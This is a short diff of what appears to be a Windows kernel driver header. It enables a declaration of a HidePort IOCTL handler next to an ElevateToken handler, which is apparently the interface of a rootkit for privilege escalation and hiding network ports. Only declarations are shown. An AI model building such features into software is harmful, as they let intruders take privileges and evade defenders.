@@ -9,5 +9,5 @@ namespace IoctlHandlers {
 
 	NTSTATUS ElevateToken(PIRP Irp);
 
-	//NTSTATUS HidePort(PIRP Irp);
+	NTSTATUS HidePort(PIRP Irp);
 }
